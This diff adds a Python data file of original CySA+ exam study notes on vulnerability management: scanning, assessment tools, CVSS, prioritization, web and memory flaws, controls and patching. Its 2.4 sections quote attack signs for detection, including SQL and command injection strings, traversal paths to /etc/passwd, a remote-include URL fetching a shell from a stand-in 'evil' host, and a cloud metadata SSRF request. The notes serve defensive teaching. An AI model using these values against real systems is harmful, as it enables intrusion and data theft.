@@ -1,0 +1,213 @@
+# CySA+ Notebook, Domain 2: Vulnerability Management. Original prose against CS0-003.
+T = "<blockquote><span class=\"tag\">Exam trap</span>{}</blockquote>"
+
+D2 = [
+# ---------------------------------------------------------------- 2.1
+dict(id="asset-discovery", o="2.1", t="Asset discovery: map scans and fingerprinting", q="fingerprint", h="""
+<p>You can&rsquo;t scan what you don&rsquo;t know exists, so vulnerability management starts with inventory.</p>
+<ul><li><strong>Map scans</strong> (discovery scans) find live hosts and open ports across a range: ping sweeps, ARP scans on a local segment, TCP SYN probes. Nmap <code>-sn</code> does host discovery without port scanning.</li>
+<li><strong>Device fingerprinting</strong> works out what a host is: OS (from TCP/IP stack quirks, <code>nmap -O</code>), services and versions (<code>nmap -sV</code>, banner grabbing), device type (printer, switch, camera).</li></ul>
+<p>Results feed the asset inventory, which then drives which scan policies apply to which hosts.</p>
+"""),
+
+dict(id="scan-considerations", o="2.1", t="Special considerations when scanning", q="scheduling", h="""
+<div class="tblwrap"><table><tr><th>Consideration</th><th>What to think about</th></tr>
+<tr><td>Scheduling</td><td>Scan outside business hours or in maintenance windows; stagger scans so they don&rsquo;t collide with backups</td></tr>
+<tr><td>Operations</td><td>Coordinate with system owners and the change process so a scan isn&rsquo;t mistaken for an attack or blamed for an outage</td></tr>
+<tr><td>Performance</td><td>Scans load the network and targets; throttle concurrency, and be careful with fragile or legacy systems</td></tr>
+<tr><td>Sensitivity levels</td><td>How aggressive the checks are; high sensitivity finds more but can crash services. Disable dangerous plug-ins (DoS checks) on production</td></tr>
+<tr><td>Segmentation</td><td>Firewalls between zones block or skew results; place a scanner or agent inside each segment</td></tr>
+<tr><td>Regulatory requirements</td><td>PCI DSS requires quarterly internal and external scans (external by an Approved Scanning Vendor) and after significant change</td></tr></table></div>
+"""),
+
+dict(id="scan-types", o="2.1", t="Scan types compared", q="credentialed", h="""
+<div class="tblwrap"><table><tr><th>Pair</th><th>First</th><th>Second</th></tr>
+<tr><td>Internal vs external</td><td>From inside the network: what an insider or someone who got in sees</td><td>From the internet: what any attacker sees first</td></tr>
+<tr><td>Agent vs agentless</td><td>Software on each host reports even when off-network; good for laptops; must be deployed and maintained</td><td>Scanner connects over the network; nothing to install; misses hosts that are offline or unreachable</td></tr>
+<tr><td>Credentialed vs non-credentialed</td><td>Logs in, reads installed software, patches and config; more accurate, fewer false positives</td><td>Sees only what is exposed on the network, the outsider&rsquo;s view; more guessing from banners</td></tr>
+<tr><td>Passive vs active</td><td>Watches existing traffic; no load and no risk; finds only what talks</td><td>Sends probes; thorough; can disrupt fragile systems</td></tr>
+<tr><td>Static vs dynamic</td><td>Analyzes code or binaries without running them (SAST, reverse engineering)</td><td>Tests the running application (DAST, fuzzing)</td></tr></table></div>
+<p><strong>Reverse engineering</strong>: disassembling or decompiling a binary to understand what it does without source code (Ghidra, IDA, debuggers). <strong>Fuzzing</strong>: feeding large volumes of malformed or random input to find crashes that indicate memory bugs.</p>
+""" + T.format("A non-credentialed scan reporting fewer findings does not mean the host is safer. It means the scanner saw less. Credentialed scans are the accurate baseline for patch status.")),
+
+dict(id="critical-infra", o="2.1", t="Critical infrastructure: OT, ICS, SCADA", q="scada", h="""
+<p><strong>OT</strong> is technology that controls physical processes. <strong>ICS</strong> is the broader family of control systems (PLCs, distributed control systems, HMIs). <strong>SCADA</strong> is ICS spread over a wide area, such as pipelines, power grids or water systems, with central supervisory control.</p>
+<p>Why scanning them is different:</p>
+<ul><li>Availability and safety come first. An aggressive scan can crash a <strong>PLC</strong> and stop a physical process.</li>
+<li>Devices are old, rarely patched, and run proprietary protocols (Modbus, DNP3) with no authentication.</li>
+<li>Prefer <strong>passive</strong> monitoring, vendor-approved tools, and testing in a lab or during planned shutdowns.</li></ul>
+<p>Protection relies on segmentation from IT networks, strict remote-access control, and compensating controls where patching isn&rsquo;t possible.</p>
+""" + T.format("For OT, &ldquo;run an active credentialed scan of the production PLCs&rdquo; is almost never the right answer. Passive discovery or scanning a test environment is.")),
+
+dict(id="baseline-frameworks", o="2.1", t="Baseline scanning and industry frameworks", q="cis", h="""
+<p><strong>Security baseline scanning</strong> checks configuration against a standard (password policy, services disabled, audit settings) rather than looking for missing patches. Results show drift from the approved build.</p>
+<div class="tblwrap"><table><tr><th>Framework</th><th>What it is</th></tr>
+<tr><td><strong>PCI DSS</strong></td><td>Card industry standard for anyone storing, processing or transmitting card data; mandates scanning, segmentation, logging</td></tr>
+<tr><td><strong>CIS Benchmarks</strong></td><td>Free, consensus hardening guides per product (Windows, Ubuntu, AWS, Kubernetes), often used as scan policies</td></tr>
+<tr><td><strong>OWASP</strong></td><td>Open web-app security community: the Top 10 risk list, Testing Guide, ASVS, ZAP</td></tr>
+<tr><td><strong>ISO 27000 series</strong></td><td>International standards for an information security management system; 27001 is certifiable, 27002 gives control guidance</td></tr></table></div>
+"""),
+
+# ---------------------------------------------------------------- 2.2
+dict(id="assessment-tools", o="2.2", t="Assessment tools: which does what", q="nikto", h="""
+<div class="tblwrap"><table><tr><th>Category</th><th>Tool</th><th>Use it for</th></tr>
+<tr><td rowspan="2">Network scanning/mapping</td><td>Angry IP Scanner</td><td>Quick GUI scan of IP ranges for live hosts and open ports</td></tr>
+<tr><td>Maltego</td><td>OSINT link analysis: graphs relationships between domains, people, emails, infrastructure</td></tr>
+<tr><td rowspan="4">Web app scanners</td><td>Burp Suite</td><td>Intercepting proxy: capture, modify and replay requests; scanner in the paid edition</td></tr>
+<tr><td>ZAP</td><td>OWASP&rsquo;s free intercepting proxy and scanner, Burp&rsquo;s open-source counterpart</td></tr>
+<tr><td>Arachni</td><td>Open-source web app scanner framework (no longer maintained)</td></tr>
+<tr><td>Nikto</td><td>Command-line web <em>server</em> scanner: dangerous files, outdated versions, default content, misconfigurations</td></tr>
+<tr><td rowspan="2">Vulnerability scanners</td><td>Nessus</td><td>Commercial (Tenable) network vulnerability scanner with plugin-based checks</td></tr>
+<tr><td>OpenVAS</td><td>Open-source vulnerability scanner (Greenbone)</td></tr>
+<tr><td rowspan="2">Debuggers</td><td>Immunity Debugger</td><td>Windows, used for exploit development and malware analysis</td></tr>
+<tr><td>GDB</td><td>GNU debugger, command line, Linux/Unix programs</td></tr>
+<tr><td rowspan="3">Multipurpose</td><td>Nmap</td><td>Discovery, port scanning, version and OS detection, NSE scripts</td></tr>
+<tr><td>Metasploit (MSF)</td><td>Exploitation framework: validate that a vulnerability is really exploitable</td></tr>
+<tr><td>Recon-ng</td><td>Modular OSINT reconnaissance framework</td></tr>
+<tr><td rowspan="3">Cloud assessment</td><td>Scout Suite</td><td>Multi-cloud configuration audit (AWS, Azure, GCP)</td></tr>
+<tr><td>Prowler</td><td>Security best-practice and compliance checks, mainly AWS (now also Azure and GCP)</td></tr>
+<tr><td>Pacu</td><td>AWS <em>exploitation</em> framework for testing, the offensive one of the three</td></tr></table></div>
+""" + T.format("Scout Suite and Prowler audit cloud configuration; Pacu attacks it. If the question says &ldquo;exploit&rdquo; or &ldquo;penetration test&rdquo; against AWS, the answer is Pacu.")),
+
+dict(id="nmap-output", o="2.2", t="Reading Nmap output", q="nmap", h="""
+<div class="tblwrap"><table><tr><th>Flag</th><th>Does</th></tr>
+<tr><td><code>-sS</code></td><td>SYN (half-open) scan, the default when run as root</td></tr>
+<tr><td><code>-sT</code></td><td>Full TCP connect scan</td></tr>
+<tr><td><code>-sU</code></td><td>UDP scan (slow)</td></tr>
+<tr><td><code>-sn</code></td><td>Host discovery only, no port scan</td></tr>
+<tr><td><code>-Pn</code></td><td>Skip discovery, treat every host as up</td></tr>
+<tr><td><code>-sV</code></td><td>Service and version detection</td></tr>
+<tr><td><code>-O</code></td><td>OS detection</td></tr>
+<tr><td><code>-A</code></td><td>Aggressive: -O, -sV, default scripts, traceroute</td></tr>
+<tr><td><code>-sC</code></td><td>Default NSE scripts</td></tr>
+<tr><td><code>-p 1-1000</code>, <code>-p-</code></td><td>Port range; all 65,535</td></tr>
+<tr><td><code>-T0</code>&hellip;<code>-T5</code></td><td>Timing, paranoid to insane</td></tr>
+<tr><td><code>-oN/-oX/-oG</code></td><td>Normal, XML, grepable output</td></tr></table></div>
+<p><strong>Port states</strong>: <strong>open</strong> (a service answered), <strong>closed</strong> (host replied with a reset, nothing listening), <strong>filtered</strong> (no reply or an ICMP unreachable, so a firewall is in the way). The service column after <code>-sV</code> shows product and version, which is what you match against CVEs.</p>
+""" + T.format("Filtered does not mean closed. It means Nmap can&rsquo;t tell, usually because a firewall dropped the probe.")),
+
+dict(id="scan-report", o="2.2", t="Reading a vulnerability scan report", q="plugin", h="""
+<p>A finding typically contains: plugin or check ID, name, severity, CVSS score and vector, CVE references, affected host and port, a description, the evidence the scanner saw (version banner or request/response), and a recommended fix.</p>
+<p>How to read it as an analyst:</p>
+<ul><li><strong>Check the evidence</strong>. If the scanner flagged a version from a banner, but the vendor backports fixes (common on Red Hat), the finding may be a false positive.</li>
+<li><strong>Check the context</strong>: is the host internet-facing? Is the service even used?</li>
+<li><strong>Group</strong> findings by fix: one missing cumulative update can account for forty findings.</li>
+<li><strong>Informational</strong> findings (TLS details, OS detected) are not vulnerabilities but may support one.</li></ul>
+"""),
+
+# ---------------------------------------------------------------- 2.3
+dict(id="cvss", o="2.3", t="CVSS interpretation", q="cvss", h="""
+<p>CVSS v3.1 base metrics describe a vulnerability independent of your environment. A vector looks like <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code> (score 9.8).</p>
+<div class="tblwrap"><table><tr><th>Metric</th><th>Values (worst first)</th><th>Meaning</th></tr>
+<tr><td>AV Attack Vector</td><td>Network, Adjacent, Local, Physical</td><td>How close the attacker must be</td></tr>
+<tr><td>AC Attack Complexity</td><td>Low, High</td><td>Conditions outside the attacker&rsquo;s control</td></tr>
+<tr><td>PR Privileges Required</td><td>None, Low, High</td><td>Access needed before attacking</td></tr>
+<tr><td>UI User Interaction</td><td>None, Required</td><td>Does a victim have to click or open something?</td></tr>
+<tr><td>S Scope</td><td>Changed, Unchanged</td><td>Can the attack affect components beyond the vulnerable one?</td></tr>
+<tr><td>C / I / A Impact</td><td>High, Low, None</td><td>Effect on confidentiality, integrity, availability</td></tr></table></div>
+<p>Severity bands: 0.1&ndash;3.9 Low, 4.0&ndash;6.9 Medium, 7.0&ndash;8.9 High, 9.0&ndash;10.0 Critical.</p>
+<p><strong>Scope Changed</strong> means the exploit breaks out of the vulnerable component&rsquo;s security authority, such as a VM escape to the hypervisor or a browser bug that affects the OS. It pushes the score up.</p>
+<p>Temporal metrics (exploit code maturity, remediation level) and environmental metrics (your asset&rsquo;s security requirements) adjust the base score. CVSS v4.0 exists (2023), but CS0-003 questions use v3.x vectors.</p>
+""" + T.format("Attack Vector: Adjacent means same local network segment (Bluetooth, same subnet), not &ldquo;next to the computer&rdquo;. Physical is touching the device.")),
+
+dict(id="validation", o="2.3", t="Validation: true and false positives and negatives", q="false positive", h="""
+<div class="tblwrap"><table><tr><th></th><th>Scanner says vulnerable</th><th>Scanner says not vulnerable</th></tr>
+<tr><td><strong>Really vulnerable</strong></td><td>True positive</td><td><strong>False negative</strong> (the dangerous one: a missed issue)</td></tr>
+<tr><td><strong>Not vulnerable</strong></td><td><strong>False positive</strong> (wasted effort)</td><td>True negative</td></tr></table></div>
+<p>Validate a finding by checking version and patch level directly on the host, re-running with credentials, comparing other tools, or confirming exploitability in a controlled test (for example Metasploit against a test copy). Document a confirmed false positive so it can be suppressed in future scans, with a review date.</p>
+""" + T.format("A false negative is worse than a false positive. The scanner said you were fine and you were not, so nothing gets fixed.")),
+
+dict(id="prioritization", o="2.3", t="Prioritizing: context, exploitability, asset value, zero-days", q="exploitability", h="""
+<p>CVSS alone is a poor priority list. Combine it with:</p>
+<ul><li><strong>Context</strong>: <strong>external</strong> (internet-facing) beats <strong>internal</strong>, which beats <strong>isolated</strong> (air-gapped or tightly segmented). The same 9.8 on an isolated lab box can wait behind a 7.5 on the public web server.</li>
+<li><strong>Exploitability/weaponization</strong>: is there public exploit code, a Metasploit module, active exploitation? CISA&rsquo;s Known Exploited Vulnerabilities (KEV) catalog and EPSS (probability of exploitation) help here.</li>
+<li><strong>Asset value</strong>: what the system does and holds. A domain controller or payment database outranks a kiosk.</li>
+<li><strong>Zero-day</strong>: a flaw with no vendor patch yet. You can&rsquo;t patch, so you apply compensating controls (WAF rule, disable the feature, isolate) and watch for exploitation.</li></ul>
+""" + T.format("When two findings tie on severity, the exposed, weaponized one on the high-value asset wins. Exposure and exploitation in the wild usually beat a slightly higher base score.")),
+
+# ---------------------------------------------------------------- 2.4
+dict(id="xss-csrf-ssrf", o="2.4", t="XSS, CSRF and SSRF", q="xss", h="""
+<div class="tblwrap"><table><tr><th>Attack</th><th>What happens</th><th>Control</th></tr>
+<tr><td><strong>Reflected XSS</strong></td><td>Script in a request parameter is echoed back in the response; victim must click a crafted link</td><td>Output encoding, input validation, Content Security Policy</td></tr>
+<tr><td><strong>Persistent (stored) XSS</strong></td><td>Script is saved by the app (comment, profile) and runs for every viewer</td><td>Same, applied when storing and when rendering; HttpOnly cookies limit theft</td></tr>
+<tr><td><strong>CSRF</strong></td><td>Victim&rsquo;s browser, already logged in, is tricked into sending a state-changing request the attacker crafted</td><td>Anti-CSRF tokens, SameSite cookies, re-authentication for sensitive actions</td></tr>
+<tr><td><strong>SSRF</strong></td><td>Server is tricked into making requests on the attacker&rsquo;s behalf, often to internal services or cloud metadata (169.254.169.254)</td><td>Allow-list destinations, block internal ranges, IMDSv2 in AWS, validate URLs server-side</td></tr></table></div>
+<p>Tell-tale log entries: <code>&lt;script&gt;</code> or <code>%3Cscript%3E</code> in parameters (XSS); a request parameter containing a URL like <code>?url=http://169.254.169.254/latest/meta-data/</code> (SSRF).</p>
+""" + T.format("XSS abuses the user&rsquo;s trust in the site (script runs in their browser). CSRF abuses the site&rsquo;s trust in the user&rsquo;s browser. SSRF abuses the server&rsquo;s trust in itself.")),
+
+dict(id="injection-traversal", o="2.4", t="Injection, directory traversal, LFI/RFI, RCE", q="injection", h="""
+<ul><li><strong>SQL injection</strong>: input becomes part of a query. Signs: <code>' OR 1=1--</code>, <code>UNION SELECT</code>, database error messages. Fix: <strong>parameterized queries</strong> (prepared statements), least-privilege DB accounts, input validation.</li>
+<li><strong>Command injection</strong>: input reaches a shell. Signs: <code>; cat /etc/passwd</code>, <code>| whoami</code>, <code>&amp;&amp;</code>. Fix: avoid shell calls, use safe APIs, allow-list input.</li>
+<li><strong>Other injection</strong>: LDAP, XML (including <strong>XXE</strong>, where an external entity reads local files), and OS/template injection follow the same pattern.</li>
+<li><strong>Directory traversal</strong>: <code>../../../../etc/passwd</code> (or <code>%2e%2e%2f</code> encoded) to read files outside the web root. Fix: canonicalize paths, allow-list file names, chroot or run with least privilege.</li>
+<li><strong>LFI</strong> makes the app include a file already on the server (<code>?page=../../etc/passwd</code>); <strong>RFI</strong> makes it include a file from an attacker&rsquo;s server (<code>?page=http://evil/shell.txt</code>), which leads straight to code execution. Fix: never pass user input to include functions; disable remote includes (PHP <code>allow_url_include=Off</code>).</li>
+<li><strong>RCE</strong> (remote code execution) is the outcome attackers want from many of these: running their commands on your server.</li></ul>
+""" + T.format("Input validation helps, but the specific fix for SQL injection the exam wants is parameterized queries (prepared statements).")),
+
+dict(id="overflows", o="2.4", t="Overflow vulnerabilities", q="overflow", h="""
+<div class="tblwrap"><table><tr><th>Type</th><th>What goes wrong</th></tr>
+<tr><td><strong>Buffer</strong></td><td>More data written to a buffer than it holds, overwriting neighboring memory</td></tr>
+<tr><td><strong>Stack</strong></td><td>A buffer overflow on the stack overwrites the saved return address, so the function &ldquo;returns&rdquo; into attacker code</td></tr>
+<tr><td><strong>Heap</strong></td><td>Overflow in dynamically allocated memory corrupts heap structures or adjacent objects</td></tr>
+<tr><td><strong>Integer</strong></td><td>Arithmetic exceeds the type&rsquo;s range and wraps (255 + 1 = 0 in 8 bits), often producing a tiny allocation that then overflows</td></tr></table></div>
+<p>Controls: bounds checking and safe functions (no <code>strcpy</code>/<code>gets</code>), memory-safe languages, compiler protections (stack canaries), <strong>DEP/NX</strong> (data areas not executable), <strong>ASLR</strong> (randomized addresses), fuzzing in testing. A long run of <code>A</code>s or <code>0x41</code>, or a NOP sled (<code>0x90 0x90...</code>), in a request or crash dump suggests an overflow attempt.</p>
+"""),
+
+dict(id="owasp-flaws", o="2.4", t="Access control, crypto failures, design and configuration flaws", q="broken access control", h="""
+<ul><li><strong>Broken access control</strong> (OWASP #1): users act outside their permissions. Example: changing <code>?account=1001</code> to <code>1002</code> shows another customer (IDOR). Fix: enforce authorization server-side on every request, deny by default.</li>
+<li><strong>Cryptographic failures</strong>: sensitive data unencrypted, weak algorithms (MD5 for passwords, DES, TLS 1.0), hard-coded keys. Fix: TLS 1.2+, strong salted password hashing (bcrypt, Argon2), proper key management.</li>
+<li><strong>Insecure design</strong>: the flaw is in the plan, not the code, such as a password reset that relies on guessable questions. Fix: threat modeling and secure design patterns before coding.</li>
+<li><strong>Security misconfiguration</strong>: default credentials, verbose errors, open cloud storage, unnecessary features enabled. Fix: hardened baselines and configuration scanning.</li>
+<li><strong>End-of-life or outdated components</strong>: libraries and platforms with known CVEs or no more patches. Fix: software composition analysis, an SBOM, upgrade plans.</li>
+<li><strong>Identification and authentication failures</strong>: credential stuffing allowed, weak passwords, session IDs in URLs, sessions that never expire. Fix: MFA, rate limiting, secure session handling.</li>
+<li><strong>Data poisoning</strong>: corrupting the data a system learns from or trusts (machine-learning training sets, threat feeds, DNS caches) to skew its output. Fix: validate data sources, monitor model behavior, control who can write training data.</li>
+<li><strong>Privilege escalation</strong>: vertical (user to admin) or horizontal (user to another user). Fix: least privilege, patching, removing SUID binaries and weak service permissions.</li></ul>
+"""),
+
+# ---------------------------------------------------------------- 2.5
+dict(id="control-types", o="2.5", t="Control types and compensating controls", q="compensating", h="""
+<p>Two different ways to classify the same control:</p>
+<div class="tblwrap"><table><tr><th>By category (who/what implements it)</th><th>By function (what it does)</th></tr>
+<tr><td><strong>Managerial</strong>: policy, risk assessment, governance</td><td><strong>Preventative</strong>: stops an incident (firewall rule, MFA)</td></tr>
+<tr><td><strong>Operational</strong>: carried out by people (training, guards, change procedures)</td><td><strong>Detective</strong>: finds an incident (IDS, log review, FIM)</td></tr>
+<tr><td><strong>Technical</strong>: implemented in technology (encryption, ACLs, EDR)</td><td><strong>Responsive</strong>: acts during an incident (IR team, automated containment)</td></tr>
+<tr><td></td><td><strong>Corrective</strong>: restores after an incident (restore from backup, patch)</td></tr></table></div>
+<p>A <strong>compensating control</strong> provides comparable protection when the required control can&rsquo;t be used, for example isolating an unpatchable legacy server on its own VLAN behind an allow-list firewall. It needs documenting and periodic review.</p>
+""" + T.format("Category and function are separate questions. A firewall is technical (category) and preventative (function). Read whether the question asks &ldquo;type&rdquo; meaning category or function.")),
+
+dict(id="patching", o="2.5", t="Patching, configuration and maintenance windows", q="rollback", h="""
+<p>Patch life cycle: <strong>testing</strong> (in a staging environment that mirrors production) &rarr; <strong>implementation</strong> (through change management, in a <strong>maintenance window</strong> agreed with the business) &rarr; <strong>rollback</strong> plan ready if it breaks something &rarr; <strong>validation</strong> (rescan or check the version to prove the fix applied).</p>
+<p>Maintenance windows are scheduled periods when downtime is acceptable. Emergency patches for actively exploited flaws can justify an out-of-band window through an emergency change.</p>
+""" + T.format("Remediation isn&rsquo;t finished when the patch is deployed. It&rsquo;s finished when a rescan validates the vulnerability is gone.")),
+
+dict(id="risk-exceptions", o="2.5", t="Risk responses, exceptions, policy and SLOs", q="risk acceptance", h="""
+<div class="tblwrap"><table><tr><th>Response</th><th>Meaning</th><th>Example</th></tr>
+<tr><td><strong>Mitigate</strong></td><td>Reduce likelihood or impact</td><td>Patch, add a WAF rule</td></tr>
+<tr><td><strong>Transfer</strong></td><td>Shift financial impact to someone else</td><td>Cyber insurance, outsourcing with contractual liability</td></tr>
+<tr><td><strong>Avoid</strong></td><td>Stop the risky activity</td><td>Retire the vulnerable service</td></tr>
+<tr><td><strong>Accept</strong></td><td>Knowingly live with it</td><td>Cost of fixing exceeds the risk; signed off by the risk owner</td></tr></table></div>
+<p><strong>Exceptions</strong> formalize acceptance for a specific finding: what the risk is, why it can&rsquo;t be fixed, which compensating controls apply, who approved it, and an expiry or review date.</p>
+<p><strong>Policies and governance</strong> set the rules: remediation timeframes by severity, who can approve exceptions. <strong>SLOs</strong> are the measurable targets, such as &ldquo;critical vulnerabilities on internet-facing systems fixed within 7 days&rdquo;. <strong>Prioritization and escalation</strong>: anything that misses its SLO, or is actively exploited, escalates to management.</p>
+""" + T.format("Insurance transfers financial loss, not the risk itself. You still suffer the breach.")),
+
+dict(id="attack-surface", o="2.5", t="Attack surface management", q="bug bounty", h="""
+<ul><li><strong>Edge discovery</strong>: find everything you expose to the internet, including forgotten subdomains, cloud instances and shadow IT (certificate transparency logs, DNS enumeration, internet-wide scan data).</li>
+<li><strong>Passive discovery</strong>: map assets without touching them, from DNS records, traffic monitoring and public data.</li>
+<li><strong>Security controls testing</strong>: verify controls actually work (does the WAF block this payload? does the EDR alert on this technique?).</li>
+<li><strong>Penetration testing</strong> exploits weaknesses to show real impact, within an agreed scope. <strong>Adversary emulation</strong> mimics a specific threat actor&rsquo;s known TTPs (often mapped to ATT&amp;CK) to test detection. Red team attacks, blue team defends, purple team works together.</li>
+<li><strong>Bug bounty</strong>: pay outside researchers for verified findings under published rules.</li>
+<li><strong>Attack surface reduction</strong>: remove what isn&rsquo;t needed, such as unused services, open ports, stale accounts and old DNS records.</li></ul>
+"""),
+
+dict(id="secure-coding", o="2.5", t="Secure coding, SDLC and threat modeling", q="input validation", h="""
+<div class="tblwrap"><table><tr><th>Practice</th><th>Defends against</th></tr>
+<tr><td><strong>Input validation</strong> (server-side, allow-list)</td><td>Injection, traversal, overflows</td></tr>
+<tr><td><strong>Output encoding</strong> (context-aware escaping)</td><td>XSS</td></tr>
+<tr><td><strong>Session management</strong> (random IDs, secure/HttpOnly/SameSite cookies, timeouts, new ID after login)</td><td>Session hijacking, fixation, CSRF</td></tr>
+<tr><td><strong>Authentication</strong> (MFA, lockout/rate limits, strong hashing)</td><td>Credential stuffing, brute force</td></tr>
+<tr><td><strong>Data protection</strong> (encrypt in transit and at rest, minimize stored data)</td><td>Cryptographic failures, data exposure</td></tr>
+<tr><td><strong>Parameterized queries</strong></td><td>SQL injection</td></tr></table></div>
+<p><strong>Secure SDLC</strong> builds security into each phase: requirements, design (threat modeling), development (secure coding, code review, SAST), testing (DAST, fuzzing), deployment (hardening), maintenance (patching, monitoring). Finding flaws early is far cheaper than after release.</p>
+<p><strong>Threat modeling</strong> asks what can go wrong before you build. STRIDE is a common method: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.</p>
+"""),
+]
